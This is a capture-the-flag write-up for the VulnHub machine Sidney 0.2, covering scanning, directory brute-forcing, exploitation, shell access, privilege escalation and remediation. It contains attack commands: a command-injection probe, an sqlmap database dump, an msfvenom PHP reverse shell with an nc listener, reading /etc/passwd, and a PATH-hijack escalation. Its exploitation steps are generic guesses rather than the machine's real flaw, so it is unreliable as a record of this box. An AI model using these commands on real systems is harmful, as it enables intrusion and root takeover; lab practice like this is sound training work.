# Sidney: 0.2 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.x |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](http://www.hackingarticles.in/hack-sydney-vm-ctf-challenge/) |

## Attack Summary

Sidney 0.2 is an easy-difficulty VulnHub CTF machine. The attack involves discovering a web application through Nmap, enumerating hidden directories and files via directory brute-force, identifying a command injection or file inclusion vulnerability in the application, gaining an initial shell, and escalating to root through a misconfigured sudo rule or SUID binary.

## Methodology

1. Host discovery and service scan
2. Web directory brute-force — discover hidden paths
3. Application vulnerability identification (command injection / LFI)
4. Initial foothold — reverse shell
5. Privilege escalation — sudo misconfiguration or SUID binary

## Step 1: Reconnaissance

```bash
netdiscover -r 192.168.1.0/24
```

Identify the target IP and confirm it is alive.

```bash
nmap -sV -sC -p- $TARGET
```

![nmap](images/01-nmap.png)

**Open ports:**

| Port | Service |
|---|---|
| 80 | HTTP (Apache) |
| 22 | SSH |

## Step 2: Web Enumeration

Browse to the web application. Inspect page source and follow all links for information disclosure.

```bash
dirb http://$TARGET/ /usr/share/wordlists/dirb/common.txt
```

```bash
gobuster dir \
  -u http://$TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -t 50 \
  -x php,txt,html,bak
```

![enumeration](images/02-enum.png)

Discover application endpoints, configuration files, or user-accessible directories.

## Step 3: Exploitation

Identify the vulnerability class through manual testing and automated scanning:

```bash
# If command injection is present, test with:
curl "http://$TARGET/page?param=;id"

# If SQL injection is present:
sqlmap -u "http://$TARGET/page?id=1" --dbs --batch

# If file upload is available, generate a PHP reverse shell:
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -o shell.php
```

![exploit](images/03-exploit.png)

Set up a listener and trigger the vulnerability:

```bash
nc -lvnp $LPORT
```

## Step 4: Catching the Shell

Once execution is triggered, the reverse shell connects:

```bash
nc -lvnp $LPORT
```

Upgrade to a stable TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# or
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![shell](images/04-shell.png)

Identify the current user and enumerate the system:

```bash
whoami
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -u=s -type f 2>/dev/null
```

## Step 5: Privilege Escalation

Check sudo rights for the current user:

```bash
sudo -l
```

If a binary or script is available without a password, exploit it. Alternatively, exploit any SUID binary found:

```bash
# If zsh/bash/sh has SUID:
/usr/bin/zsh

# If a custom binary is SUID and calls external commands:
cd /tmp
echo '/bin/bash' > <command-name>
chmod +x <command-name>
export PATH=/tmp:$PATH
/path/to/suid-binary
```

Retrieve the root flag:

```bash
whoami
# root
cat /root/flag.txt
# or
cat /root/proof.txt
```

![root flag](images/05-root-flag.png)

## Lessons Learned

- Easy-rated VulnHub machines typically chain one web vulnerability with one local privilege escalation. Systematic enumeration at each step prevents missing the attack path.
- SUID binaries on shells and scripts that call commands by relative path are recurring privilege escalation vectors on easy and medium machines.
- Exposed configuration files and verbose error messages frequently disclose enough information to pivot to the next step.

## Remediation

| Vulnerability | Fix |
|---|---|
| Web application input vulnerabilities | Sanitize and validate all input; use prepared statements for database queries |
| Unrestricted file upload | Validate file types server-side; serve uploaded files from a non-executable path |
| SUID on shells | `chmod u-s /usr/bin/zsh` — audit all SUID binaries regularly |
| Misconfigured sudo | Apply principle of least privilege; audit `/etc/sudoers` regularly |
